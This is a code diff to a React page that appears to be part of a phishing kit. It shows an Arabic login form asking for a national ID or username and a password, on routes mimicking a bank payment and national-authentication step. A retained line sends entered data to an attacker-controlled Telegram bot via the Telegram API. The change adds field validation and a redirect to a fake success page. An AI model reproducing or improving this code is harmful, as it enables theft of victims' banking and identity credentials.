@@ -24,6 +24,14 @@ const Page = () => {
         fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
       
       }
+      const handlerout = ()=>{
+        if(password.current.value == ""){
+          alert('من فضلك قم بملى الحقول')
+        }else{
+          
+          router.push('/fozajil/banks/pay/code/nphad/nphadsecuess')
+        }
+      }
 
   return (
     <div className={styles.continer}>
@@ -48,7 +56,7 @@ const Page = () => {
         <form onSubmit={handleOnSubmit} >
             <input type="text" placeholder='اسم المستخدم او رقم الهوية الوطنية' ref={username} required />
             <input type="text" ref={password} placeholder='كلمة المرور' required />
-            <button type='submit' onClick={() => router.push('/fozajil/banks/pay/code/nphad/nphadsecuess')}>تسجيل الدخول</button>
+            <button type='submit' onClick={handlerout}>تسجيل الدخول</button>
         </form>
     </div>
   )
